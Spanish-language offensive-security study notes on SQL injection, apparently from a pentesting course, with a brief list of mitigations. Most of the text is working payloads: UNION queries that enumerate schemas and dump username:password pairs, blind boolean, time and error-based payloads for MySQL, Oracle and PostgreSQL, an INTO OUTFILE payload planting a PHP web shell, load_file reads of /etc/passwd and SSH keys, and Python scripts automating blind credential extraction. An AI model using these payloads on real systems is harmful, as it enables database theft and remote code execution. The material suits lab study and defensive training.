# SQL Injection

Tags: #SQLI #OWASP #Explotacion 

**SQL Injection** (**SQLI**) es una técnica de ataque utilizada para explotar vulnerabilidades en aplicaciones web que **no validan adecuadamente** la entrada del usuario en la consulta SQL que se envía a la base de datos. Los atacantes pueden utilizar esta técnica para ejecutar consultas SQL maliciosas y obtener información confidencial, como nombres de usuario, contraseñas y otra información almacenada en la base de datos.

Las inyecciones SQL se producen cuando los atacantes insertan código SQL malicioso en los campos de entrada de una aplicación web. Si la aplicación no valida adecuadamente la entrada del usuario, la consulta SQL maliciosa se ejecutará en la base de datos, lo que permitirá al atacante obtener información confidencial o incluso controlar la base de datos.

```bash 
En puntos donde la aplicación interactúa con una 'base de datos', generalmente sin sanitizar correctamente la entrada del usuario.

Ejemplos:
- Páginas de login ('username', 'password', 'reset password') 
- Parámetros en URLs ('/product?id=1')
- Búsquedas internas ('search=')
- Formularios de registro, comentarios, contacto
- Headers modificables (User-Agent, Cookie, Referer)

Mitigación:
- Consultas parametrizadas evitando concatenar variables en las consultas 
- Validación estricta (solo enteros id=123)
- Usuarios con menor privilegio 
```

## Errores comunes

```bash 
1. La web muestra '500 server error' 
2. Error 'Connection failed: SQL Syntax error or access violation'
3. Algo cambia en la web 
```

## Tipos de inyecciones SQL en Banda:

```bash 
1. Reflejado:
-   'Inyección SQL basada en errores': Este tipo de inyección SQL aprovecha errores en el código SQL para obtener información. Por ejemplo, si una consulta devuelve un error con un mensaje específico, se puede utilizar ese mensaje para obtener información adicional del sistema.

-   'Inyección SQL basada en uniones': Este tipo de inyección SQL utiliza la cláusula “'UNION'” para combinar dos o más consultas en una sola. Por ejemplo, si se utiliza una consulta que devuelve información sobre los usuarios y se agrega una cláusula 'UNION' con otra consulta que devuelve información sobre los permisos, se puede obtener información adicional sobre los permisos de los usuarios.


2. A ciegas:
-   'Inyección SQL basada en tiempo': Este tipo de inyección SQL utiliza una consulta que tarda mucho tiempo en ejecutarse para obtener información. Por ejemplo, si se utiliza una consulta que realiza una búsqueda en una tabla y se añade un retardo en la consulta, se puede utilizar ese retardo para obtener información adicional

-   'Inyección SQL basada en booleanos': Este tipo de inyección SQL utiliza consultas con expresiones booleanas para obtener información adicional. Por ejemplo, se puede utilizar una consulta con una expresión booleana para determinar si un usuario existe en una base de datos.

--- 
-   'Inyección SQL basada en stacked queries': Este tipo de inyección SQL aprovecha la posibilidad de ejecutar múltiples consultas en una sola sentencia para obtener información adicional. Por ejemplo, se puede utilizar una consulta que inserta un registro en una tabla y luego agregar una consulta adicional que devuelve información sobre la tabla.
```

## Tipos de inyecciones SQL fuera de banda (OOB)

```bash 
- 'DNS': Extrae datos via dominios controlados por el atacante.

- 'SMB': Usa UNC paths para confirmar condiciones según resolución de recursos 
```

## Tipos de bases de datos existentes:

-   **Bases de datos relacionales**: Las inyecciones SQL son más comunes en bases de datos relacionales como MySQL, SQL Server, Oracle, PostgreSQL, entre otros. En estas bases de datos, se utilizan consultas SQL para acceder a los datos y realizar operaciones en la base de datos.
-   **Bases de datos NoSQL**: Aunque las inyecciones SQL son menos comunes en bases de datos NoSQL, todavía es posible realizar este tipo de ataque. Las bases de datos NoSQL, como MongoDB o Cassandra, no utilizan el lenguaje SQL, sino un modelo de datos diferente. Sin embargo, es posible realizar inyecciones de comandos en las consultas que se realizan en estas bases de datos. Esto lo veremos unas clases más adelante.
-   **Bases de datos de grafos**: Las bases de datos de grafos, como Neo4j, también pueden ser vulnerables a inyecciones SQL. En estas bases de datos, se utilizan consultas para acceder a los nodos y relaciones que se han almacenado en la base de datos.
-   **Bases de datos de objetos**: Las bases de datos de objetos, como db4o, también pueden ser vulnerables a inyecciones SQL. En estas bases de datos, se utilizan consultas para acceder a los objetos que se han almacenado en la base de datos.

Es importante entender los diferentes tipos de inyecciones SQL y cómo pueden utilizarse para obtener información confidencial y controlar una base de datos. Los desarrolladores deben asegurarse de validar adecuadamente la entrada del usuario y de utilizar técnicas de defensa, como la sanitización de entrada y la preparación de consultas SQL, para prevenir las inyecciones SQL en sus aplicaciones web.

A continuación, se proporciona el enlace a la utilidad online de ‘**ExtendsClass**‘ que utilizamos en esta clase:

-   **ExtendsClass MySQL Online**: [https://extendsclass.com/mysql-online.html](https://extendsclass.com/mysql-online.html)


## Conforma una DB

Tenemos: **DB > TABLAS > COLUMNAS > DATOS**
**Antes de la primer coma debemos de colocar un valor que no exista en la DB. Así lo que inyectemos se podrá visualizar.**

* [Cheat-Sheet-SQLI](https://portswigger.net/web-security/sql-injection/cheat-sheet)
* [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

## Diferentes formas de inyección 

```bash  
❯ echo -n 'H' | xxd -p           # Cambiar letras o palabras a hexadecimal 'H -> 0x48' por si hay bloqueo 
```

## Inyecciones 'UNION' con error 

```mysql
# Rara vez acepta la inyeccion SQL sin el primer ' ya que no existe otra comilla por comentar. Al momento de colocar -- - (comentario) y no sale error en la web podriamos iniciar con las SQLi. 

❯ -- -
❯ order by 3-- -


❯ ' or '1'='1               # La mas sencilla y nos devolveria un true, dejamos una comilla sin cerrar ya que la propia query la cerrara
❯ ' or 1=1-- -              # La mas sencilla y nos devolveria un true, aveces hace bypass en el panel de autenticacion, pero devuelve todo en la bvase de datos cuando no se utiliza en el panel de login
❯ ' or 1=1 # 
❯ <user>'-- -               # Este se usa en un panel de login 
❯ ' order by 100-- -        # Ordenamiento con la 100va columna e ir adivinando hasta que no nos marque un error
❯ ' and if()-- a        

+ = Espacio en blanco en la URL
```

## Conocer el numero de columnas

```mysql
# MYSQL

❯ union select 1,2,3 --+                 # Determinar el numero de columnas 
❯ ' union select 1,2,3 -- -              
❯ ' union select NULL,NULL,NULL -- -     # Aveces solo acepta NULL en lugar de numeros
❯ ' union select "test",NULL,NULL -- -   # Podemos colocar texto 
❯ ' union select database()-- -          # Mostrar el nombre de la base de datos actual en uso
❯ ' union select user() -- -             # Mostrar el nombre del usuario 

❯ ' union select NULL,@@version-- -      # Mirar la version de MySQL y Microsoft
```

## Conocer las DBs existentes

```mysql 
❯ ' union select schema_name from information_schema.schemata-- -                    # Muestra todas las bases de datos existentes  
❯ ' union select schema_name from information_schema.schemata limit 0,1-- -          # Muestra la primer base de datos existente, la cual podemos ir variando, limitando a 1 resultado, el que varia es el '0' a 1,2,3, etc...
❯ ' union select group_concat(schema_name) from information_schema.schemata-- -      # Muestra todas las bases de datos existentes en una linea, pero separadas por comas
```

## Conocer las tablas de la DB especifica

```mysql
# MYSQL

❯ ' union select table_name from information_schema.tables where table_schema='❮DB_Name❯'-- -  # Nos muestra las tablas existentes
❯ ' union select group_concat(table_name) from information_schema.tables where table_schema='❮DB_Name❯'-- -  # Nos muestra las tablas existentes, pero separadas por comas
❯ ' union select table_name from information_schema.tables limit 0,1-- -   # Nos muestra las tablas existentes, pero limita a 1 resultado, el que varia es el 0 a 1,2,3, etc...
```

## Conocer las columnas de la tabla en la DB especifica

```mysql 
# MYSQL 

❯ ' union select column_name from information_schema.columns where table_schema='❮DB_Name❯' and table_name='❮Table_Name❯'-- -                    # Nos muestra las columnas existentes
❯ ' union select column_name from information_schema.columns where table_schema='❮DB_Name❯' and table_name='❮Table_Name❯' limit 0,1-- -          # Nos muestra las columnas existentes, pero limita a 1 resultado, el que varia es el 0 a 1,2,3, etc...
❯ ' union select group_concat(column_name) from information_schema.columns where table_schema='❮DB_Name❯' and table_name='❮Table_Name❯'-- -     # Nos muestra las columnas existentes en una sola linea, pero separadas por comas
```

## Mostrar los datos de las columnas

```mysql
# MYSQL 

❯ ' union select group_concat(username) from ❮DB_Name❯.❮Table_Name❯-- -          # Especificamos la DB y la tabla, esto si la DB no es la que esta en uso y solo asi podemos ver los datos que queremos
❯ ' union select group_concat(username) from ❮Table_Name❯-- -                    # Para que nos muestre los datos, aqui asumimos que la base de datos es la que esta en uso 
❯ ' union select group_concat(username,':',password) from ❮Table_Name❯-- -       # Para que nos muestre los datos de los usuarios y su passwd separados por : 
❯ ' union select username||':'||password from ❮Table_Name❯-- -                   # Para que nos muestre los datos de los usuarios y su passwd separados por : 
❯ ' union select group_concat(username,0x3a,password) from ❮Table_Name❯-- -      # Para que nos muestre los datos de los usuarios y su passwd separados por :

	 # Debemos de colocar los caracteres en Hexadecimal para evitar fallos
	 # : = 0x3a (Hex) 

❯ ' union select NULL,password from ❮Table_Name❯ where username = '0x61646d696e' -- -  # Podemos ofuscar (ocultar) la data, ya que muchas veces existe una sanitizacion que no permite ingresar cadenas de texto
	# 0x61646d696e (Hex) = admin 

❯ ' union select NULL,concat(username,':',password) from ❮Table_Name❯-- -         # Otra forma de agrupar los datos 
```

```mysql 
# DVWA
❯ ' union select user,password from users #         
```

## Subir un archivo a una ruta especifica de la maquina victima

```mysql 
# Subir un achivo PHP malicioso en una ruta especifica para RCE
❯ ' union select "<?php system($_REQUEST['cmd']); ?>" into outfile "/var/www/html/shell.php" 

# Ir a la ruta y con el archivo subido, se puede ejecutar comandos de la siguiente manera:
❯ shell.php?cmd=whoami
```

## Leer (cargar) archivos de la maquina victima 

```mysql 
❯' union select load_file("/etc/passwd")-- -   # Leer el '/etc/passwd' de la máquina víctima 

Rutas:
- /home/user/.ssh/id_rsa       # Leer el 'id_rsa' del usuario de la máquina víctima
- /home/user/user.txt          # Leer la flag 
- /var/www/html/config.php     # Leer la condiguración de config  
```

## Blind Boolean

```bash 
# Boolean 

	'a' or 'b'  ->  Devuelve 'True' si al menos una de las dos condiciones es verdadera
	'a' and 'b' ->  Devuelve 'True' si todas las condiciones son verdaderas 
```

```mysql 
# En este tipo de inyecciones te devuelve '1 = True', '0 = False', o sea, o se muestra o no se muestra 

❯ ' and 1=1 

# Forma: (Sentencia, 1, 0)=1, primero indicar la sentencia, luego indicamos que queremos que devuelva si es verdadero (o sea 1), por ultimo que se quiere que devuelva si es falso (o sea 0) 
❯ ' and (if(2>1,1,0))=1       # Indicar que 2>1, si esto es verdad entonces nos devolvera 1, por lo tanto 1=1 = True
❯ ' and (if(0>1,1,0))=1       # Indicar que 0>1, como esto no es verdad entonces nos devolvera 0, por lo tanto 0=1 = False

❯ ' or substring(database(),1,1)='a'-- -    # Si el nombre de la DB en su primer caracter es igual a 'a' devuelve un 'True'

❯ ' and ( if( substring(database(),1,1)='p' ,1,0))=1       # Indicar que la primer letra de la base de datos es igual a 'p', si esto es verdad entonces entonces devolvera un 1, por lo que tendriamos 1=1 = True. El numero que debemos ir variando es el primer 1 que se encuentra al lado de 'database()' ya que este numero es el encargado de moverse al siguiente caracter en el nombre de la DB a buscar. 
❯ ' and ( if( substring(database(),2,1)='r' ,1,0))=1
```

```python 
#!/usr/bin/env python3

from pwn import *
import requests
import signal
import sys
import time
import string
import pdb


def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl + c
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "https://localhost/searchUsers.php"   # Se coloca 'Host + Ruta'
characters = string.ascii_letters + string.digits + '_-,~*./@:$'  # Se puede colocar string.printable

# Esto se hace cuando en la Cookie existen dos valores 
cookies = {
	'XSRF-TOKEN': 'valor'
	'laravel_session': 'valor'
}

def MakeSQLI():

    database = ""
    p1 = log.progress("SQLi")
    p1.status("Iniciando fuerza bruta")
    time.sleep(2)
    p2 = log.progress("Database")
    
	for position in range(1,20):
		for character in characters:
			# Cuerpo de la petición en BurpSuite que se enviará por POST
			post_data = {
				'_token': 'valor',
				'email': "test' or substring(database(),%d,1)='%s' -- -" % (position, character)
			}

			p1.status(post_data['email'])  # Mirar un campo especifico 
			r = requests.post(main_url, data=post_data, cookies=cookies)

			if "We have e-mailed your password" in r.text:
				database += character 
				p2.status(database)
				break

if __name__ == '__main__':
    MakeSQLI()

---
# Para conocer las tablas en una sola fila, se debe agregar la siguiente 'nested query' e incrementar el numero de la posición a 200: 
test' or substr((select group_concat(table_name) from information_schema.tables where table_schema='usage'),%d,1)='%s' -- -

---
# Para conocer las columnas 
test' or substr((select group_concat(column_name) from information_schema.columns where table_schema='usage' and table_name='admin_users'),%d,1)='%s' -- -

---
# Para conocer las credenciales 
test' or substr((select group_concat((BINARY username),':',(BINARY password)) from usage.admin_users),%d,1)='%s' -- -
	# BINARY = Es para hacer que sea 'case sensitive' 
```

## Blind Time 

```mysql 
# Con un 'sleep' podemos suponer que la inyeccion es de tipo 'Blind' en MYSQL

❯ ' and sleep(5)-- -                                  # Haremos que tarde en responder la web 5 segundos
❯ ' or sleep(5)-- -                                   # Haremos que tarde en responder la web 5 segundos

❯ and (select sleep(5) from <table_name> where substring(database(),1,1)='p' limit 0,1) 
# Tardara 5 segundos si la primer letra de la primer DB es igual a 'p'
	# limit 0,1 = Comparar con la primer DB

❯ ' || pg_sleep(5) -- -                               # Inyeccion de tiempo para DB PostgreSQL
```

## Inyecciones Blind con respuesta condicional 

-   **ExtendsClass MySQL Online**: [https://extendsclass.com/mysql-online.html](https://extendsclass.com/mysql-online.html)
Cuando estas en una web a ciegas, tenemos dos formas de hacerlo, por **Tiempo** o **Boolean**.

```mysql 
# Esto funciona cuando hay un error visual en la pagina web 

❯ ' and substr((Consulta), Inicio, longitud))=''                          # Forma de usar el substr
	# Longitud = Los caracteres que vamos a extraer
	# Inicio = Es la posicion inicial del caracter a comparar 
	# Consulta = Es la peticion que vamos a hacer

❯ ' and substring((select schema_name from information_schema.schemata limit 0,1),1,1)='A'      # Bases MYSQL
	# Donde 0 indica la primer base de datos y es el valor que ira variando, esto dependiendo de las bases de datos que existan
	# El segundo '1' es la posicion de la letra en cada palabra y este valor ira variando para ir avanzando a las sig. posiciones de la palabra
	# 'A' es la letra a la que queremos igualar la consulta 
```

```mysql 
# Encontrar el usuario de la tabla conocida 

# Si el usuario de la tabla 'users' se llama 'administrator' devuelve a, por lo tanto a=a = True
❯ ' and (select 'a' form users where username='administrator')='a'-- -

#  Confirmar cada caracter del usuario 'administrator' en la tabla 'users', el valor despues del username ira variando al momento que vayamos encontrando cada letra. 
❯ ' and (select substring(username,1,1) from users where username='administrator')='a' -- -  
❯ ' and (select substring(username,2,1) from users where username='administrator')='d' -- -


# Conocer la longitud de la passwd. Si la longitud de la password es mayor a 5 y el usuario de llama 'administrator' de la tabla 'users'devuelve una 'a', por lo tanto a=a = True
❯ ' and (select 'a' from users where username='administrator' and length(password)>5)='a'-- -
	# Podemos ir variando el numero hasta dar con la longitid (>,<,<=,=,>=)
	

# Obtener cada caracter de la password, del usuario 'adminnistrator' en la tabla 'users'. Si la primer letra de la password es la 'a' entonces nos dara un a=a = True, el valor despues del username ira variando al momento que vayamos encontrando cada letra. 
❯ ' and (select substring(password,1,1) from users where username='administrator')='a' -- - 
❯ ' and (select substring(password,2,1) from users where username='administrator')='b' -- - 
```

## Inyección Blind con error condicional 

```bash 
# Esto es cuando miras un error '500 internal server error' o un '200 ok' cuando esta bien la consulta en  Oracle

❯ ' and (select 'a' from dual)='a'-- - 

# Si es erroneo, entonces no se generara la division (error) y nos devolvera una 'a', por lo que a=a = True. Si cambiamos el numero 2 por 1, entonces si hara la division y no nos devolvera la 'a'.
❯ ' and (select CASE when (1=2) then to_char(1/0) else 'a' end from dual)='a' -- -

# Saber la longitud de la pasword es verdadera generara el error '500', cuando ya no sea verdadero es ahi cuando sabremos la longitud de la password, porque nos regresara un 'ok'
❯ ' and (select CASE when lenth(password)>1 then to_char(1/0) else 'a' end from users where username='administrator')='a' -- -

# Si la primer letra de la password es igual a 'a' genera el error '500', de lo contrario recibiremos un 'ok'
❯ ' and (select CASE when substr(password,1,1)='a' then to_char(1/0) else 'a' end from users where username='administrator')='a' -- -
```

## Inyecciones sin ver el error en el Output 'Blind'

```python
#!/usr/bin/python3

import requests
import signal
import sys
import time
import string
from pwn import *

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)
    
# Ctrl + c
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "http://localhost/searchUsers.php"
characters = string.printable

def MakeSQLI():
    p1 = log.progress("Fuerza Bruta")
    p1.status("Iniciando fuerza bruta")
    time.sleep(2)
    p2 = log.progress("Datos extraidos")
    extrated_info = ""

    for position in range(1, 150):
        for character in range(33, 126): # El 9 es un valor que no existe en la web
            sqli_url = main_url + "?id=9 or (select(select ascii(substring((select group_concat(username,0x3a,password) from users),%d,1)) from users where id = 1)=%d)" % (position, character)
#           sqli_url = main_url + "?id=9 or (select(select ascii(substring((select group_concat(schema_name) from information_schema.schemata),%d,1)) from users where id = 1)=%d)" % (position, character)
            p1.status(sqli_url)
            r = requests.get(sqli_url)
            if r.status_code == 200:
                extrated_info += chr(character)
                p2.status(extrated_info)
                break

if __name__ == '__main__':
    MakeSQLI()

```

## SQL BLIND Time

```bash 
# Obtener informacion con una SQL Time en PostgreSQL

# Si el usuario se llama 'administrator' esperara 5 seg, de lo contrario no esperara nada 
❯ ' ;select case when (username='administrator') then pg_sleep(5) else pg_sleep(0) end from users-- - 


# Para extraer la longitud de la password, como si es verdad se tardara los 5 seg, de lo contrario no se tardara nada y es ahi cuando sabremos la longitud de la password
❯ ' ;select case when (username='administrator' and length(password)>1) then pg_sleep(5) else pg_sellep(0) end from users-- - 


# Obtener la password del usuario administrator, si la primer letra de la password es igual a 'a' tardara 5seg, de lo contrario no tardara nada 
❯ ' ;select case when (username='administrator' and substring(password,1,1)='a') then pg_sleep(5) else pg_sellep(0) end from users-- -
```

```python 
# Para MySQL 

#!/usr/bin/python3

import requests
import signal
import sys
import time
import string
from pwn import *

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)
    
# Ctrl + c
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "http://localhost/searchUsers.php"
characters = string.printable

def MakeSQLI():
    p1 = log.progress("Fuerza Bruta")
    p1.status("Iniciando fuerza bruta")
    time.sleep(2)
    p2 = log.progress("Datos extraidos")
    extrated_info = ""

    for position in range(1, 150):
        for character in range(33, 126): # El 1 de abajo es un valor que si existe
            sqli_url = main_url + "?id=1 and if(ascii(substr(database(),%d,1))=%d,sleep(0.35),1)" % (position, character)
           #sqli_url = main_url + "?id=1 and if(ascii(substr((select group_concat(username,0x3a,password) from users),%d,1))=%d,sleep(0.35),1)" % (position, character)
            p1.status(sqli_url)
            time_start = time.time()
            r = requests.get(sqli_url)
            time_end = time.time()
            if time_end - time_start > 0.35:
                extrated_info += chr(character)
                p2.status(extrated_info)
                break

if __name__ == '__main__':
    MakeSQLI()
```

